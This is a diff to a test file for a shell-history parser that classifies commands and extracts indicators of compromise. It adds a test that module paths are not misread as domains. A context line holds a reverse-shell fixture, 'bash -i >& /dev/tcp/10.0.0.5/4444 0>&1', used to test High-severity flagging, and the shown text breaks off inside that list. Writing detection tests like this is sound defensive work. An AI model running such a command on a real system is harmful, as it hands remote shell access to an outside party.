@@ -70,6 +70,11 @@ describe("parseShellHistoryFile — classification + IOCs", () => {
     expect(r.iocs.some((c) => c.value === "nina.kapoor")).toBe(false);
   });
 
+  it("does not treat a dotted config/module path as a domain (no real TLD)", () => {
+    const r = parseShellHistoryFile("#1715708576\npython3 -m detectraptor.windows.detection.amcache", {});
+    expect(r.iocs.some((c) => c.type === "domain")).toBe(false);
+  });
+
   it("flags reverse shells, download-and-exec, cred access and anti-forensics as High", () => {
     const evil = [
       "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
